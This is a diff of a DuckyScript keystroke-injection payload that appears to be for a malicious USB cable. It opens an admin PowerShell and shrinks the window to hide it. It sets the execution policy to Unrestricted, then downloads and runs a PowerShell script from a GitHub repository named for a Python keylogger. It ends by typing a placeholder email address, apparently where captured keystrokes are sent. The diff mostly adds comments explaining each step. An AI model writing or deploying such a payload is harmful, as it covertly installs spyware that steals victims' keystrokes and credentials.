@@ -1,20 +1,27 @@
+REM --> Brings up quick access menu 
 WINDOWS x
+REM --> Brings up powershell admin
 STRING a
 DELAY 900
 LEFTARROW
 ENTER
 DELAY 900
+REM --> make window small
+STRING mode con:cols=18 lines=1
 ENTER
+REM --> Allows powershell scripts to be run,todo: set back after installing
 STRING Set-ExecutionPolicy -scope CurrentUser Unrestricted
 ENTER
 DELAY 500
 STRING Y
 ENTER
+REM --> Downloads ps1 file
 STRING wget "https://raw.githubusercontent.com/csandoval63/OMGCableStuff/master/Python%20keylogger%20stuff%20with%20DUCKYscript/install_python.ps1" -outfile "install_python.ps1"
 ENTER
+REM --> runs ps1 file
 STRING ./install_python.ps1
 ENTER
-REM 2 mins, seconds, note that ducky is limited to 10000 ms
+REM 2 mins, seconds, note that ducky is limited to 10000 ms do what you will with that information
 DELAY 140000
 STRING emailhere
 ENTER
